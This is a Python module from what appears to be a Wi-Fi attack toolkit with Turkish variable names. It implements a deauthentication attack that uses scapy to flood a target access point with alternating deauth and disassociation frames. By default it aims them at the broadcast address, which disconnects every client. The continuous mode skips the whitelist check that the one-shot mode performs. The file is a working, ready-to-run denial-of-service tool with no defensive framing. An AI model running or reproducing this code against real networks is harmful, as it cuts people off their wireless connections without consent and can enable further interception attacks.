import random
import time
from threading import Event, Thread

from scapy.all import sendp

from ..context import Module
from ..dot11 import REASON_KODLARI
from ..frames import deauth_frame
from ..iface import kanal_ayarla
from ..whitelist import oku as wl_oku


class DeauthModule(Module):
    name = "deauth"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.dur = Event()
        self.thread = None
        self.bssid = None
        self.client = None
        self.sayac = 0

    def on(self, bssid=None, client=None, channel=None):
        if self.active:
            self.ctx.log("[deauth] already active", "warn")
            return
        if not bssid:
            self.ctx.log("[deauth] usage: module deauth on <bssid> [client] [ch]", "err")
            return
        if channel:
            try:
                kanal_ayarla(self.ctx.iface, int(channel))
            except Exception:
                pass
        self.bssid, self.client, self.sayac = bssid, client, 0
        self.dur.clear()
        self.active = True
        self.thread = Thread(target=self._loop, daemon=True)
        self.thread.start()
        self.ctx.log(f"[deauth] started {bssid} client={client or 'BCAST'}", "ok")

    def _loop(self):
        i = 0
        while not self.dur.is_set():
            reason = REASON_KODLARI[i % len(REASON_KODLARI)]
            tip = "disassoc" if i % 2 else "deauth"
            hedef = self.client or "ff:ff:ff:ff:ff:ff"
            try:
                sendp(deauth_frame(self.bssid, hedef, tip, reason),
                      iface=self.ctx.iface, verbose=False)
                self.sayac += 1
                if self.sayac % 50 == 0:
                    self.ctx.log(f"[deauth] {self.sayac} frames r={reason}", "dim")
            except Exception:
                pass
            i += 1
            self.dur.wait(0.05)

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.thread:
            self.thread.join(timeout=2)
        self.active = False
        self.ctx.log(f"[deauth] stopped ({self.sayac})", "ok")

    def once(self, bssid, client=None, count=100, jitter=0.0):
        wl = wl_oku()
        if bssid.lower() in wl:
            self.ctx.log(f"[deauth] {bssid} beyaz listede — atlandı", "warn")
            return
        if client and client.lower() in wl:
            self.ctx.log(f"[deauth] {client} beyaz listede — atlandı", "warn")
            return

        def _run():
            hedef = client or "ff:ff:ff:ff:ff:ff"
            for i in range(count):
                reason = REASON_KODLARI[i % len(REASON_KODLARI)]
                tip = "disassoc" if i % 2 else "deauth"
                try:
                    sendp(deauth_frame(bssid, hedef, tip, reason),
                          iface=self.ctx.iface, verbose=False)
                except Exception:
                    pass
                bekle = 0.05 + random.uniform(0, jitter)
                time.sleep(bekle)
            self.ctx.log(f"[deauth] {count} → {bssid}", "ok")
        Thread(target=_run, daemon=True).start()

    def status(self):
        return f"active ({self.sayac})" if self.active else "off"
